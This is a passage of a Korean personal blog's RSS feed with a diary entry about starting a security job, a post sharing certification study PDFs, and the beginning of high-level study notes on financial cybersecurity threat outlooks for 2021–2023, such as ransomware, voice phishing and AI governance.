        <description>&lt;p&gt;근황.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;입사했다.&lt;/p&gt;

&lt;p&gt;정말 재미있게 회사 다니고 있다.&lt;/p&gt;

&lt;p&gt;매 순간이 Challenge인데, 그만큼 내 세계도 넓어지는 거라 기껍게 응하고 있다. I challenge to challenges 같은 느낌&lt;/p&gt;

&lt;p&gt;원래도 탐구하고 새로운 영역을 알아가는 게 좋아서 연구자가 꿈이었는데,&lt;/p&gt;

&lt;p&gt;그런 욕구가 생각지도 못했던 장소에서 원하는 만큼 충족되고 있어서 아주 만족스럽다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그런데 조금 곤란한 건 내가 체험이나 한 번 해봤던 분야에 관해서도 업무를 해야 할 것 같다는 점인데&lt;/p&gt;

&lt;p&gt;두렵거나 부담스럽진 않다&lt;/p&gt;

&lt;p&gt;왜냐하면 starting from snippets였던 경험이 너무 많아서, 처음 접하는 분야에 접근하는 방식에 관해 이제 정말 기술이라 부를 수 있는 정도의 숙련도가 생긴 것 같기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 BOB 할 때가 2021년인데(3년밖에 안 됐다고????), 그때 혼자 넋두리로 ‘아 멘토님들 하시는 거 보면… 난 삽질을 숟가락 들고 하는데 저분들은 포크레인 들고 해버리셔’라고 했던 걸 기억한다&lt;/p&gt;

&lt;p&gt;지금의 나는 포크레인까진 아니고 삽질을 정직하게 삽 정도는 들고 하고 있는 것 같다&lt;/p&gt;

&lt;p&gt;그리고 제일 중요한 건 마인드가 바뀌었다는 건데&lt;/p&gt;

&lt;p&gt;예전에는 뭐??????? 숟가락으로 산을 옮겨????????? 어떻게 해 저걸???? 무서워!!!!!!!!!! 흐아앙!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;이었다면 지금은&lt;/p&gt;

&lt;p&gt;뭐? 삽으로 산을 옮겨?? 그래 뭐… 하다 보면 언덕 하나 정돈 옮기겠지…&lt;/p&gt;

&lt;p&gt;하면서 울지않고 냅다직진. 하게 되었다는 게&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;나도 이 점이 웃긴데 진짜 왜 이렇게 된 거지&lt;/p&gt;

&lt;p&gt;두려워할 시간에 걍 해&lt;/p&gt;

&lt;p&gt;부정적인 감정은 다 실패하고 나서 느껴도 늦지 않아&lt;/p&gt;

&lt;p&gt;이게 내 기본 기제가 된 게 너무 웃김 걍&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아무튼 그래서 매일이 재미있다&lt;/p&gt;

&lt;p&gt;어려운데 어려운 만큼 컨텐츠가 끊이질 않아서 흥미진진함&lt;/p&gt;

&lt;p&gt;나 스스로도 성장하는 게 느껴져서 좋고&lt;/p&gt;

&lt;p&gt;동료와 상사분들이 아주 배울 점이 많은 사람들이라 좋다
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아 근데 나 해킹 좀 잘하고 싶다&lt;/p&gt;

&lt;p&gt;솔직히 이건 보안 하는 사람들의 로망 아닐까&lt;/p&gt;

&lt;p&gt;CTF 나가서 1등 해보고 싶다 막이래
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 그래서 우리 원내 학습 동아리 만들었다&lt;/p&gt;

&lt;p&gt;나랑 어울려준 동기들아 정말 고마워&lt;/p&gt;

&lt;p&gt;후회없도록 양질의 컨텐츠 제공할게&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;마지막으로&lt;/p&gt;

&lt;p&gt;벌크업 성공했다&lt;/p&gt;

&lt;p&gt;사실 지금도 절찬리에 하는 중이다&lt;/p&gt;

&lt;p&gt;근육량 22kg 되고 싶다&lt;/p&gt;

&lt;p&gt;지금은 20kg임&lt;/p&gt;

&lt;p&gt;ㅋㅋ&lt;/p&gt;
</description>
        <pubDate>Sat, 20 Apr 2024 08:24:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/Diary/240420</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/Diary/240420</guid>
      </item>
    
      <item>
        <title>금융보안원 및 KISA 준비 자료 공유</title>
        <description>&lt;p&gt;올해 8월 말부터 시작된 취준이 지원 기업 모두 최종합격이라는 결말로 끝났다.&lt;/p&gt;

&lt;p&gt;KISA와 금융보안원에 나란히 지원했었고, 두 기관의 전형 일정이 일주일 남짓 차이 났기 때문에&lt;/p&gt;

&lt;p&gt;한 기관의 한 전형을 준비하는 데 약 일주일 정도의 시간만이 있었다.&lt;/p&gt;

&lt;p&gt;정말 정신없이 바빴던 것 같다. 이건 나중에 쓸 2023년 회고에 자세히 쓰겠지만…
&lt;br /&gt;
일단 금융보안원 자소서 제출 기간이 Fiesta2023 기간과 겹쳤던 것부터 머리를 쥐어뜯어야 했다.&lt;/p&gt;

&lt;p&gt;나도 문제 풀고 싶었어… 패기롭게 솔로로 나갔는데 20등이 뭐야 20등이 나 더 할 수 있었는데
&lt;br /&gt;
또 막바지 최종 면접 기간에는 KISA 최종 면접 다녀오고 나니 코로나 19 진단을 받기도 했다. 정확히 일주일 뒤에 금융보안원 최종 면접이라 진짜 곤란했다.&lt;/p&gt;

&lt;p&gt;이와 관련해서는 20대 초반 몸이 많이 안 좋았던 때의 경험이 크게 도움되었다. (지금은 완치된 지병 때문이었다)&lt;/p&gt;

&lt;p&gt;그 몇 년 동안 몸이 크게 나빠졌을 때 어떤 식으로 정신을 잡고 정보를 처리해야 하는지 체득했었고, 최소한의 에너지로 최대한의 효율을 내는 방법을 익혔기 때문이었다.&lt;/p&gt;

&lt;p&gt;그리고 그땐 솔직히 코로나로 응급실까지 갔던 지금보다 훨씬 아팠는데 누워서 학교 중간고사 공부했고… 앉아있을 힘이 없어서 의자에 상체를 묶고 공부하기도 했으니&lt;/p&gt;

&lt;p&gt;아니 사실 진짜 별것 아니게 느껴졌다 ㅋㅋㅋㅋ 그래… 응급실 가기 전까진 그랬다는 거다…
&lt;br /&gt;
아무튼! 혹시라도 자가격리 기간이 금융보안원 최종과 겹칠까 봐 정말 걱정했는데, 다행히도 하루 차이로 격리가 끝나기도 했고 전염성도 없어졌다고 판정나서 응시할 수 있었다.
&lt;br /&gt;
뭐 죽을 것 같긴 했지만 어쨌든 둘 다 결과가 좋았으니 된 거 아닐까?
&lt;br /&gt;
KISA 결과 뜨고 금보원 결과 뜰 때까지 며칠 간격이 있었는데, 혹시 둘 다 붙으면 어떻게 해야 하는가(ㅋㅋㅋㅋㅋㅋ 김칫국 시원하게 마시는구만!!) 내 커리어는 어떻게 결정해야 할까 정말 고민 많이 했다.&lt;/p&gt;

&lt;p&gt;그런데 아무래도 금융보안아카데미가 정말 큰 부분을 차지하더라.&lt;/p&gt;

&lt;p&gt;거기에서 연이 닿았던 금보원 멘토님들이 하나같이 너무 좋은 분들이고, 날 정말 아껴 주셔서 아 이런 분들과 동료가 된다면 정말 행복하겠다 여러 번 생각했었기 때문이다.&lt;/p&gt;

&lt;p&gt;그리고 아카데미를 하며 금보원에 대해 가졌던 이미지가 너무 좋았다.&lt;/p&gt;

&lt;p&gt;그렇다고 KISA가 사람이 안 좋고 그렇다는 건 또 아니다. 오히려 KISA에 대해서는 정보가 너무 없었기 때문에 아무 감정이 없었다.
&lt;br /&gt;
음… 내 인생을 통틀어 멘토님이 되어주셨던 분이 KISA에 재직하신 적이 있었는지라? 그런데 너무 옛날 일이어서 그 분도 어어 그래 KISA 나주로 본사 이전했지 뛰어난 사람들 정말 많아 그러고보니 나 거기서 논문 썼던 것 같은데 어라?? 야 이거 너무 오래 돼서 자료 없다 정도만 말씀해 주셨다&lt;/p&gt;

&lt;p&gt;그러니까 0과 양의 정수의 차이였던 거다.
&lt;br /&gt;
그런 고로… KISA와 금융보안원 필기 시험을 준비할 때 내가 정리한 자료를 블로그에 공유하고자 한다.&lt;/p&gt;

&lt;p&gt;또 운좋게도 어찌저찌 NCS까지 패스할 수 있었기도 해…. 그런데 이건 정말 운이 좋았던 거라 공부를 어떻게 했는지 공유가 어렵다. 정말로 그냥 준비를 못하고 가서 봤는데, 개념서에서 본 개념이 나왔다…………..
&lt;br /&gt;
아니 잡설 진짜 길어지네 죄송합니다.&lt;/p&gt;

&lt;p&gt;링크 누르시면 다운로드할 수 있을 텐데… 안되면 알려주세요
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/jobapply/정보보안기사1.pdf&quot;&gt;정보보안기사정리1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/jobapply/정보보안기사2.pdf&quot;&gt;정보보안기사정리2&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 05 Dec 2023 10:05:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/certification_study/financial2</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/certification_study/financial2</guid>
      </item>
    
      <item>
        <title>금융사이버보안이슈 정리 백업</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#3개년-동안-지속된-금융사이버보안-위협&quot; id=&quot;markdown-toc-3개년-동안-지속된-금융사이버보안-위협&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협&quot; id=&quot;markdown-toc-순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협&quot; id=&quot;markdown-toc-2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2021년-디지털금융-및-사이버보안-이슈-전망&quot; id=&quot;markdown-toc-2021년-디지털금융-및-사이버보안-이슈-전망&quot;&gt;2021년 디지털금융 및 사이버보안 이슈 전망&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#3개년-동안-지속된-금융사이버보안-위협-1&quot; id=&quot;markdown-toc-3개년-동안-지속된-금융사이버보안-위협-1&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-1&quot; id=&quot;markdown-toc-순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-1&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-1&quot; id=&quot;markdown-toc-2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-1&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2022년-디지털금융-및-사이버보안-이슈-전망&quot; id=&quot;markdown-toc-2022년-디지털금융-및-사이버보안-이슈-전망&quot;&gt;2022년 디지털금융 및 사이버보안 이슈 전망&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#3개년-동안-지속된-금융사이버보안-위협-2&quot; id=&quot;markdown-toc-3개년-동안-지속된-금융사이버보안-위협-2&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-2&quot; id=&quot;markdown-toc-순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-2&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-2&quot; id=&quot;markdown-toc-2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-2&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2023년-디지털금융-및-사이버보안-이슈-전망&quot; id=&quot;markdown-toc-2023년-디지털금융-및-사이버보안-이슈-전망&quot;&gt;2023년 디지털금융 및 사이버보안 이슈 전망&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#3개년-동안-지속된-금융사이버보안-위협-3&quot; id=&quot;markdown-toc-3개년-동안-지속된-금융사이버보안-위협-3&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-3&quot; id=&quot;markdown-toc-순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-3&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-3&quot; id=&quot;markdown-toc-2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-3&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/finIssue/%E1%84%8C%E1%85%A6%E1%84%86%E1%85%A9%E1%86%A8%20%E1%84%8B%E1%85%A5%E1%86%B9%E1%84%82%E1%85%B3%E1%86%AB%20%E1%84%83%E1%85%A6%E1%84%8B%E1%85%B5%E1%84%90%E1%85%A5%E1%84%87%E1%85%A6%E1%84%8B%E1%85%B5%E1%84%89%E1%85%B3%20020157fb36d0477dbc667149fed2a869.csv&quot;&gt;제목 없는 데이터베이스&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;3개년-동안-지속된-금융사이버보안-위협&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;랜섬웨어, 랜섬디도스, 보이스피싱&lt;/li&gt;
  &lt;li&gt;마이플랫폼으로 자리매김한 데이터 산업&lt;/li&gt;
  &lt;li&gt;금융서비스의 대면 비대면 일원화, 디지털 금융 서비스의 일원화(All-in-One 앱)&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;새로운 금융인증제-디지털신원인증으로 인한 리스크&lt;/li&gt;
  &lt;li&gt;AI&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;디지털자산의 확산에 따른 리스크 관리-금융보안규제와 자율보안&lt;/li&gt;
  &lt;li&gt;오픈소스 리스크&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;2021년-디지털금융-및-사이버보안-이슈-전망&quot;&gt;2021년 디지털금융 및 사이버보안 이슈 전망&lt;/h2&gt;

&lt;h3 id=&quot;3개년-동안-지속된-금융사이버보안-위협-1&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;비대면 금융
    &lt;ul&gt;
      &lt;li&gt;비대면 금융 타겟으로 한 금융사기의 다양화 및 고도화
        &lt;ul&gt;
          &lt;li&gt;실명확인 절차상의 취약점을 악용
            &lt;ul&gt;
              &lt;li&gt;신분증 위조로 알뜰폰 개통 → 계좌 개설 → 공인인증서 발급 및 등록 → 피해자의 개인정보 변경→ 자금이체 또는 대출 실행&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;모바일 뱅킹 앱 자체의 취약점을 악용&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 시사점
        &lt;ul&gt;
          &lt;li&gt;비대면 금융의 위협은 지속될 것, 파급력 또한 확대될 것.
            &lt;ul&gt;
              &lt;li&gt;전자금융거래법 개정으로 비대면 금융 방식과 서비스의 확대 → 어텍 서페이스의 확대&lt;/li&gt;
              &lt;li&gt;오픈뱅킹, 마이데이터 산업 활성화로 보안사고 전파력의 상승 → 한 금융사의 사고가 타 금융사로 전파되는 식.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;보안성과 포용성을 모두 확보하여 서비스 제공&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;랜섬웨어와 랜섬디도스 공격 증가
    &lt;ul&gt;
      &lt;li&gt;랜섬웨어 공격 방식 고도화 및 협박 수위 강화: 정보유출 협박&lt;/li&gt;
      &lt;li&gt;국내 금융권 대상 랜섬디도스 공격 급증
        &lt;ul&gt;
          &lt;li&gt;주로 UDP 증폭 반사 공격 기법 사용 - IP 스푸핑이 가능&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 시사점
        &lt;ul&gt;
          &lt;li&gt;랜섬웨어와 랜섬디도스 공격 수행 환경이 점점 공격자 친화적으로 변화하고 있음 → 위험 확대 전망
            &lt;ul&gt;
              &lt;li&gt;랜섬웨어: RaaS, 다크웹 내 해킹 정보 판매 등&lt;/li&gt;
              &lt;li&gt;랜섬디도스: IoT 기기 보급 증대 → 봇넷으로 악용 가능, 디도스 공격 대행 서비스의 등장&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;금융권의 철저한 대비 요망
            &lt;ul&gt;
              &lt;li&gt;금융권은 대량의 개인(신용)정보를 보관 + 서비스 가용성이 매우 중요 → 즉 아주 좋은 타겟&lt;/li&gt;
              &lt;li&gt;랜섬웨어 대응 방안
                &lt;ul&gt;
                  &lt;li&gt;이메일 경유 악성코드 유입 예방: 스팸메일 차단 + 악성코드 사전 검사&lt;/li&gt;
                  &lt;li&gt;데이터 유출 대비: DRM 등의 문서 암호화 보안솔루션 도입&lt;/li&gt;
                  &lt;li&gt;사전 대비: 다크웹 상의 랜섬웨어 공모, 데이터 유출 등 모니터링&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;랜섬디도스 대응 방안
                &lt;ul&gt;
                  &lt;li&gt;사전 대비:
                    &lt;ul&gt;
                      &lt;li&gt;국내외 랜섬디도스 공격 관련 정보 공유 및 모니터링&lt;/li&gt;
                      &lt;li&gt;UDP뿐 아니라, 대응이 더 어려운 TCP 기반 공격 발생 가능성도 고려, 대응훈련 실시 등의 사전 대비 필요&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;보이스피싱
    &lt;ul&gt;
      &lt;li&gt;갈수록 고도화, 지능화 추세
        &lt;ul&gt;
          &lt;li&gt;대출 사기형, 기관 사칭형, 메신저 피싱, 납치/사고 빙자형 등으로 체계적 접근&lt;/li&gt;
          &lt;li&gt;수법이 더욱 치밀해지는 상황&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;모바일 앱 악용하는 수법도 등장
        &lt;ul&gt;
          &lt;li&gt;악성 모바일 앱 설치 유도 → 전화 가로채기, 휴대폰 원격제어로 피해자 명의 금융 앱 실행&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 시사점
        &lt;ul&gt;
          &lt;li&gt;보이스피싱 + 신기술 → 위험도 상승
            &lt;ul&gt;
              &lt;li&gt;AI 활용: 딥페이크 기술을 이용한 정교화&lt;/li&gt;
              &lt;li&gt;클라우드 리스크: 클라우드 이용 확대 → 클라우드에 더욱 가치 있는 정보 많이 저장 → 클라우드 해킹으로 중요 정보 획득하여 보이스피싱&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;전방위적 대응의 필요
            &lt;ul&gt;
              &lt;li&gt;AI 기반으로 예방 및 대응 방안 고도화&lt;/li&gt;
              &lt;li&gt;범금융권 정보 공유체계 구축&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;데이터 산업 경쟁 본격화
    &lt;ul&gt;
      &lt;li&gt;신용정보법 개정 → 개인신용정보의 가명, 익명처리 가능 / 데이터 간 결합 가능&lt;/li&gt;
    &lt;/ul&gt;
    &lt;ul&gt;
      &lt;li&gt;금융 빅데이터 개방시스템(CreDB)등으로 금융데이터 개방&lt;/li&gt;
      &lt;li&gt;금융데이터거래소 출범 → 데이터 거래 활성화 지원
    - 금융권 데이터 산업(마이데이터 등) 주도권 확보를 위한 경쟁 시작
    - 전망 및 시사점&lt;/li&gt;
      &lt;li&gt;데이터 산업의 성공을 위해서는 반드시 보안성을 확보해야 함
        &lt;ul&gt;
          &lt;li&gt;금융데이터 유출 사고 발생 시, 금융소비자 피해 + 금융데이터 산업 전반의 신뢰 하락 가능&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;순위권에서-한-번-빠졌으나-3년간-요주의-대상이었던-사이버보안-위협-1&quot;&gt;순위권에서 한 번 빠졌으나 3년간 요주의 대상이었던 사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;새로운 인증시장의 향방
    &lt;ul&gt;
      &lt;li&gt;인증 정책의 전환: 공인인증서에서 다양한 인증수단으로
        &lt;ul&gt;
          &lt;li&gt;전자서명법 개정으로 다양한 인증수단의 동등 경쟁 환경 조성&lt;/li&gt;
          &lt;li&gt;공인인증서 폐지 후 금융 인증시장 선점을 위한 경쟁 본격화&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 시사점
        &lt;ul&gt;
          &lt;li&gt;‘신규 사업 기회’ → 고객 잠금 효과를 노림&lt;/li&gt;
          &lt;li&gt;보안성을 반드시 전제로 하여 인증수단의 다양성 존중&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;AI 거버넌스 구축&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;2023년 동향: NH 농협은행(23.5)에 이어 나이스평가정보에서 AI거버넌스 수립 및 도입 움직임&lt;/p&gt;

      &lt;ul&gt;
        &lt;li&gt;AI 활용 확대에 따른 부작용의 우려
          &lt;ul&gt;
            &lt;li&gt;AI 편향: 차별적 결과의 도출로 금융소비자 피해 유발&lt;/li&gt;
            &lt;li&gt;AI 불투명성: 내부 처리 과정을 알 수 없기 때문에 결과의 공정성에 대한 불신
              &lt;ul&gt;
                &lt;li&gt;신용정보법 제32조2에 의거, 금융소비자가 금융회사에 AI 도출 결과에 대한 설명을 요구할 수 있는 권리가 보장되므로 이는 큰 문제의 소지가 될 수 있음&lt;/li&gt;
              &lt;/ul&gt;
            &lt;/li&gt;
            &lt;li&gt;AI 보안 위협
              &lt;ul&gt;
                &lt;li&gt;Adversarial Attacks등 AI 취약점 악용&lt;/li&gt;
              &lt;/ul&gt;
            &lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;해외 각국은 AI 위험 최소화를 위한 각종 정책 발제 및 시행&lt;/li&gt;
        &lt;li&gt;전망 및 시사점
          &lt;ul&gt;
            &lt;li&gt;전선 업무 위주였던 금융권 AI 도입이 빅데이터와 연계하여 중선, 후선 업무로 확대될 예정
              &lt;ul&gt;
                &lt;li&gt;이는 AI 위협의 현실화를 불러올 것&lt;/li&gt;
              &lt;/ul&gt;
            &lt;/li&gt;
            &lt;li&gt;AI 거버넌스 구축이 선결 과제
              &lt;ul&gt;
                &lt;li&gt;AI 위험 최소화 및 설명 가능한 AI(XAI)&lt;/li&gt;
                &lt;li&gt;단 위의 연구는 초기 단계로 가시적이지 않음; 따라서 AI 거버넌스 확립이 최우선 정책 과제
                  &lt;ul&gt;
                    &lt;li&gt;금융위는 ‘20.7. 금융분야 AI 활성화를 위한 워킹그룹을 구성했음&lt;/li&gt;
                  &lt;/ul&gt;
                &lt;/li&gt;
              &lt;/ul&gt;
            &lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;2개년-동안-지속됐으며-화제성이-있는-금융사이버보안-위협-1&quot;&gt;2개년 동안 지속됐으며 화제성이 있는 금융사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;금융 산업 개방
    &lt;ul&gt;
      &lt;li&gt;금융 산업 개방에 따른 플레이어 확대 및 다변화
        &lt;ul&gt;
          &lt;li&gt;전자금융거래법 개정(’20.11.27 발의)로 전자금융업을 자금이체업, 대금결제업, 결제대행업으로 통폐합하고, 지급지시업을 추가로 도입해 총 4개 업종으로 재분류&lt;/li&gt;
          &lt;li&gt;그러나 2년 넘게 국회에 계류되어 있다가, ‘21 머지포인트 사태 계기로 수정 보완하여 ‘23.8.24 국회 본회의 통과 → 선불업 규제 강화 및 면제 사유 축소&lt;/li&gt;
          &lt;li&gt;금융 산업 개방
            &lt;ul&gt;
              &lt;li&gt;오픈뱅킹: 하나의 앱으로 모든 은행 계좌 조회 이체 가능&lt;/li&gt;
              &lt;li&gt;마이데이터: 개인신용정보 전송요구권 행사로 본인 정보의 일괄 조회 관리, 맞춤형 금융상품 추천&lt;/li&gt;
              &lt;li&gt;지급지시전달업: 지급지시를 청산기관에 전달해 이행 지원하는 사업. 규제 강화로 자금보유 필&lt;/li&gt;
              &lt;li&gt;종합지급결제업: 모든 전자금융 서비스 제공 가능, 자기자본 등 지정 요건이 있어 빅테크 기업 대상&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;플레이어의 종류와 요구되는 노력
        &lt;ul&gt;
          &lt;li&gt;금융사: 금융그룹사 통합 플랫폼 구축, 외부 협력으로 자사 금융상품 및 서비스 고도화 필&lt;/li&gt;
          &lt;li&gt;빅테크 기업: 기존 플랫폼 기반으로 금융사와 제휴 혹은 직접 금융업에 진출&lt;/li&gt;
          &lt;li&gt;핀테크 기업: 혁신적 서비스 개발, 타 금융회사 상품 비교 추천 서비스 개발 등&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 시사점
        &lt;ul&gt;
          &lt;li&gt;금융권 보안 리스크의 상호연계성 확대 경계 필
            &lt;ul&gt;
              &lt;li&gt;협력기업의 보안 취약점이 금융사의 취약점으로 전이될 수 있음(보이스피싱 등의 금융범죄와 관련)&lt;/li&gt;
              &lt;li&gt;협력기업의 보안 리스크를 면밀히 고려할 것&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;2022년-디지털금융-및-사이버보안-이슈-전망&quot;&gt;2022년 디지털금융 및 사이버보안 이슈 전망&lt;/h2&gt;

&lt;h3 id=&quot;3개년-동안-지속된-금융사이버보안-위협-2&quot;&gt;3개년 동안 지속된 금융사이버보안 위협&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;디지털 팬데믹-랜섬웨어 대유행
    &lt;ul&gt;
      &lt;li&gt;현황
        &lt;ul&gt;
          &lt;li&gt;가속화된 디지털 전환 → 가상자산의 활성화, 공격의 비즈니스화로 랜섬웨어 및 핵티비즘의 증가&lt;/li&gt;
          &lt;li&gt;랜섬웨어의 고도화 및 핵티비스트들의 활동 지속
            &lt;ul&gt;
              &lt;li&gt;랜섬웨어 공격 대상이 개인 → 기업 또는 주요 인프라&lt;/li&gt;
              &lt;li&gt;다중협박, APT, 공급망 공격과의 결합&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전망 및 대응전략
        &lt;ul&gt;
          &lt;li&gt;사이버굥격으로 인한 금융위기의 가능성
            &lt;ul&gt;
              &lt;li&gt;주요 금융회사 또는 금융 인프라의 장기간 중단 등&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
